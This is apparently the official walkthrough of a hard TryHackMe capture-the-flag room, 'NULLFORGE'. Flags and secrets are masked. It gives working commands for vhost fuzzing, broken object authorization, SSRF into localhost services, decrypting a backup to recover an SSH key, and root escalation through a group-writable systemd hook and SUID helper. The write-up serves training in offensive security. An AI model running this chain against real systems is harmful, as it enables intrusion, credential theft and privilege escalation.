# NULLFORGE — Official Walkthrough

> **TryHackMe:** https://tryhackme.com/room/nullforge  
> **Difficulty:** Hard  
> **Type:** Challenge / Boot2Root  
> **Target completion time:** ~120 minutes  
> **Flags:** 10

---

## ⚠️ Author Note

This walkthrough is written for the **official room write-up**.

Sensitive challenge values are intentionally masked as `****`:

- Flag values
- Machine IPs
- Host addresses
- Derived secrets
- Private key material
- Other values that would unnecessarily expose the exact answer

The walkthrough still explains the complete intended discovery path from reconnaissance to root.

---

# Attack Chain

```text
Public HTTP
    │
    ▼
Web enumeration
    │
    ▼
Hidden virtual host
    │
    ▼
Deployment Console
    │
    ▼
Unauthorized deployment record
    │
    ▼
Internal Operations API
    │
    ▼
SSRF
    │
    ▼
Internal Forge
    │
    ▼
Backup Service
    │
    ▼
Encrypted Backup
    │
    ▼
SSH Key Recovery
    │
    ▼
ops
    │
    ▼
systemd timer
    │
    ▼
Writable trusted configuration
    │
    ▼
Root execution
    │
    ▼
SUID helper
    │
    ▼
root
```

---

# Task 1 — THE FIRST SIGNAL

## 1. Enumerate the attack surface

Start with a full TCP scan:

```bash
nmap -Pn -sC -sV -p- MACHINE_IP
```

The expected external attack surface contains:

```text
22/tcp   SSH
80/tcp   HTTP
```

The other NULLFORGE services are intentionally bound to localhost and should not appear in the external scan.

The web service identifies itself as Nginx.

---

## 2. Inspect the web application

Request the homepage:

```bash
curl -i http://MACHINE_IP/
```

Look through the page rather than immediately attacking it.

Useful application paths include:

```text
/status
/docs/operations
/fetch?url=
/assets/ops-manifest.json
```

The `/assets/ops-manifest.json` endpoint is especially interesting.

Retrieve it:

```bash
curl -s http://MACHINE_IP/assets/ops-manifest.json
```

Inspect the JSON carefully.

The response contains the first challenge marker.

### Flag 01

```text
THM{NULLFORGE::01::****}
```

---

# Task 2 — THE RECORD THAT SHOULDN'T EXIST

## 3. Enumerate virtual hosts

The public application contains clues that another deployment-facing interface exists.

Enumerate likely vhosts:

```bash
printf "www\nadmin\nportal\nconsole\nops\ndev\nstatus\ninternal\n" > /tmp/nullforge-vhosts.txt
```

Then:

```bash
ffuf -u http://MACHINE_IP/ \
-H "Host: FUZZ.nullforge.internal" \
-w /tmp/nullforge-vhosts.txt \
-fs 1609
```

The interesting response is different from the normal/default vhost.

The discovered hostname is:

```text
console.nullforge.internal
```

Add it to `/etc/hosts` if required:

```bash
echo "MACHINE_IP console.nullforge.internal" | sudo tee -a /etc/hosts
```

Then inspect:

```bash
curl http://console.nullforge.internal/
```

---

## 4. Inspect the visible deployment

The console displays a deployment identifier similar to:

```text
NF-2026-***
```

Request its record:

```bash
curl -s \
http://console.nullforge.internal/api/v1/deployments/NF-2026-***
```

Read the JSON carefully.

The important clue is that another deployment identifier is referenced by the application.

Instead of assuming that the identifier is protected, request the referenced object directly:

```bash
curl -s \
http://console.nullforge.internal/api/v1/deployments/NF-2026-***
```

The second record contains information that should not be available to the current user.

This is the intended broken object authorization stage.

The response also reveals an internal service:

```text
http://127.0.0.1:8081
```

### Flag 02

```text
THM{NULLFORGE::02::****}
```

### Flag 03

```text
THM{NULLFORGE::03::****}
```

---

# Task 3 — THE SERVICE BEHIND THE WALL

## 5. Identify the server-side request primitive

The public portal contains a remote resource inspection function:

```text
/fetch?url=
```

The important question is **who performs the HTTP request**.

Test it against the internal service discovered in the deployment record:

```bash
curl -i \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/health"
```

A response from the internal service confirms that the web application is making the request on the attacker's behalf.

This is the intended SSRF pivot.

---

## 6. Enumerate the Operations API

Use the same primitive to reach a diagnostic endpoint:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/diagnostics"
```

Inspect the complete response.

The verification field contains the fourth flag.

### Flag 04

```text
THM{NULLFORGE::04::****}
```

Next inspect the internal registry:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:8081/api/v1/registry"
```

The registry identifies additional localhost-only services, including:

```text
127.0.0.1:8082
127.0.0.1:9090
```

These are the next stages.

---

## 7. Reach the internal Forge

Request the backup-related project:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/projects/nightly-backup"
```

Follow the returned artifact reference.

Then retrieve the nightly manifest:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/artifacts/nightly-manifest.json"
```

The manifest connects the Forge service to the backup workflow and contains the fifth flag.

### Flag 05

```text
THM{NULLFORGE::05::****}
```

---

# Task 4 — THE ARCHIVE THAT REMEMBERS

## 8. Enumerate the backup service

The previous stage revealed a backup service on localhost.

Query it through the SSRF primitive:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/backups/latest"
```

Inspect these fields:

```text
artifact
encryption
job
created
verification
```

The verification field gives:

### Flag 06

```text
THM{NULLFORGE::06::****}
```

---

## 9. Retrieve the encrypted archive

Use the download endpoint:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:9090/api/v1/download/****" \
-o /tmp/****.tar.gz.enc
```

Verify that the downloaded file exists:

```bash
ls -lh /tmp/*.tar.gz.enc
```

At this stage the archive is encrypted, so simply extracting it will not work.

---

## 10. Discover how the archive is encrypted

Return to the Forge service and inspect the backup policy:

```bash
curl -s \
"http://MACHINE_IP/fetch?url=http://127.0.0.1:8082/api/repositories/ops-backup-config/files/backup-policy.json"
```

The policy tells you:

```text
Cipher: AES-256-CBC
KDF: PBKDF2
Passphrase rule: latest_commit + job_start_hhmm
```

Now correlate this with the earlier Forge/backup metadata.

You need:

```text
latest commit: ****
job start:     ****
```

Combine them according to the stated rule.

The resulting passphrase is intentionally omitted here:

```text
****
```

This is an information-correlation step, not a brute-force step.

---

## 11. Decrypt the archive

Use the parameters discovered above:

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 \
-in /tmp/****.tar.gz.enc \
-out /tmp/****.tar.gz \
-pass pass:'****'
```

List the contents before extracting:

```bash
tar -tzf /tmp/****.tar.gz
```

The archive contains:

```text
home/ops/.ssh/id_****
README.txt
flag07.txt
```

Extract it:

```bash
mkdir -p /tmp/nullforge-backup
tar -xzf /tmp/****.tar.gz -C /tmp/nullforge-backup
```

Read the seventh flag:

```bash
cat /tmp/nullforge-backup/flag07.txt
```

### Flag 07

```text
THM{NULLFORGE::07::****}
```

---

## 12. Recover the SSH foothold

The archive contains an SSH private key associated with the next account.

Protect the key:

```bash
chmod 600 /tmp/nullforge-backup/home/ops/.ssh/id_****
```

Use it to connect:

```bash
ssh -i /tmp/nullforge-backup/home/ops/.ssh/id_**** ops@MACHINE_IP
```

Confirm the account:

```bash
whoami
```

Expected:

```text
ops
```

Now retrieve the user-stage flag:

```bash
cat /home/ops/user.txt
```

### Flag 08

```text
THM{NULLFORGE::08::****}
```

---

# Task 5 — THE LAST SCHEDULE

## 13. Begin local enumeration

Now the attack has moved from the web layer to the host.

Start with:

```bash
id
```

Notice the additional group associated with the NULLFORGE maintenance system.

Enumerate systemd timers:

```bash
systemctl list-timers --all | grep nullforge
```

The interesting timer is:

```text
nullforge-maint.timer
```

---

## 14. Inspect the root service

Inspect the timer's service:

```bash
systemctl cat nullforge-maint.service
```

Pay close attention to:

```text
User=root
EnvironmentFile=/etc/nullforge/maint.env
ExecStart=/usr/local/sbin/nullforge-maint
```

This shows that the maintenance process executes with root privileges and loads its environment from a separate file.

---

## 15. Inspect the environment configuration

Read:

```bash
cat /etc/nullforge/maint.env
```

The important setting resembles:

```text
ROTATION_HOOK=/home/ops/.local/bin/nf-hook
```

Now check the file's permissions:

```bash
ls -l /etc/nullforge/maint.env
```

The group ownership and write permission reveal the intended trust boundary.

The important observation is:

```text
ops → belongs to the maintenance group
maintenance configuration → group-writable
systemd service → executes as root
```

The service therefore trusts a value that a low-privileged user can influence.

---

## 16. Follow the trusted execution path

Inspect the hook referenced by the configuration:

```bash
cat /home/ops/.local/bin/nf-hook
```

Then wait for the scheduled maintenance job to execute, or observe the next timer execution.

After the privileged job has run, inspect:

```bash
ls -l /usr/local/libexec/nullforge-report
```

The helper now has the SUID bit:

```text
-rwsr-xr-x
```

The maintenance action also exposes the stage-nine flag through the `ops` account.

Retrieve it:

```bash
cat /home/ops/.cache_stage09
```

### Flag 09

```text
THM{NULLFORGE::09::****}
```

---

## 17. Obtain root

At this point the custom helper is SUID-root.

Confirm with:

```bash
find /usr/local/libexec -perm -4000 -type f -ls
```

Then execute:

```bash
/usr/local/libexec/nullforge-report
```

Verify the resulting privileges:

```bash
whoami
```

Expected:

```text
root
```

and:

```bash
id
```

should report:

```text
uid=0(root)
```

---

## 18. Retrieve the final flag

Read:

```bash
cat /root/root.txt
```

### Flag 10

```text
THM{NULLFORGE::10::****}
```

---

# Flag Progression

| Flag | Discovery point |
|---|---|
| **FLAG 01** | Public application manifest |
| **FLAG 02** | Deployment Console |
| **FLAG 03** | Unauthorized deployment object |
| **FLAG 04** | Operations API |
| **FLAG 05** | Internal Forge |
| **FLAG 06** | Backup Service |
| **FLAG 07** | Encrypted backup |
| **FLAG 08** | `ops` SSH foothold |
| **FLAG 09** | Trusted systemd maintenance path |
| **FLAG 10** | Root |

---

# Final Attack Path

```text
Recon
  ↓
HTTP
  ↓
Virtual-host discovery
  ↓
Deployment Console
  ↓
Object authorization weakness
  ↓
Internal service disclosure
  ↓
SSRF
  ↓
Operations API
  ↓
Forge
  ↓
Backup
  ↓
Encryption-policy correlation
  ↓
Encrypted archive
  ↓
SSH private key
  ↓
ops
  ↓
systemd timer
  ↓
Writable trusted configuration
  ↓
Root execution
  ↓
SUID helper
  ↓
root
```

# Author QA

Before publishing:

```text
[ ] Fresh deployment boots
[ ] 22/tcp and 80/tcp are reachable
[ ] Internal services remain localhost-only
[ ] All 10 flags are obtainable
[ ] No plaintext private key remains outside the intended archive
[ ] No unintended sudo/SUID shortcut exists
[ ] The exported OVA has been tested
[ ] The intended path works from a clean Kali attacker VM
[ ] The full solve fits the advertised target time
```
